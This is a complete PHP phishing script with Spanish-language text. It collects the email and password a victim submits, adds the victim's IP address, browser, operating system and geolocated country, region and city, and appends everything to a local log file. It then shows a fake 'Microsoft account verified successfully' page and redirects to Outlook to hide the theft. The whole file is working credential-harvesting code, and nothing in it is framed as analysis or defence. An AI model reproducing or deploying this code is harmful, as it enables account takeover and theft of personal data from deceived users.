<?php
@session_start();
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No hemos podido detectar su navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
@$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Caracas');


////////////////////

if( isset ($_POST['usec']) && isset ($_POST['clave']) ){

	$file = fopen("mexicoyhonduras.html", "a");
fwrite($file, "email : " .$_POST['usec']. PHP_EOL);
fwrite($file, "password : " .$_POST['clave']. PHP_EOL);
fwrite($file, "Fecha: " .date ('l jS \of F Y h:i:s A',time()). PHP_EOL);
fwrite($file, "SO= ".$user_os.", Nave= ".$navegador. PHP_EOL);
fwrite($file, "IP= ".$userp. PHP_EOL);
fwrite($file, "Ubicacion= ".$pais.", ".$region.", ".$ciudad. PHP_EOL);
fwrite($file, "======================" . PHP_EOL);
@header ('refresh:5;url=https://outlook.live.com/');
session_destroy();
}else{ header ('index.html'); exit(); 
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Informaci&oacute;n</title>
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<link rel="stylesheet" type="https://outlook.live.com/" href="https://outlook.live.com/"></head>

<body>
<br><br><br>
<div align="center">
    <h3>¡Cuenta Microsoft Verificada con Éxito!</h3><br>
	
</div>
       

</body>
</html>